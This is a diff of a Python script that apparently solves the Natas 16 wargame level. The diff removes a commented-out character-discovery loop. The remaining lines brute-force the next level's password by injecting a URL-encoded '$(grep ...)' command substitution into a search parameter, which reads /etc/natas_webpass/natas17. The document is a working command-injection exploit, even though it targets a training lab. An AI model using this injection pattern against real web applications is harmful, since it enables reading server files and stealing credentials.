@@ -21,23 +21,6 @@ length = 32
 offset = '' 
 characters = list(string.ascii_letters+string.digits)
 
-#first lets try to see if we can find which characters are in the password
-
-#valid_characters = list() #empty list to add valid characters too
-
-#for c in characters:
-#        payload = '?needle=%24%28grep+{}+..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(c)
-#        r = requests.get(url+payload, headers=headers)
-#        if len(r.text) > 1105:
-#                valid_characters.append(c)
-
-#print('there are {} valid characters: '.format(len(valid_characters)))
-
-#for v in valid_characters:
-#        print(v, end='')
-
-#print('\n')
-
 for p in range(0,length): #loop for each character in the password
     for c in characters: #loop for each possible character as defined above (letters + digits)
         payload = '?needle=%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(offset, c)
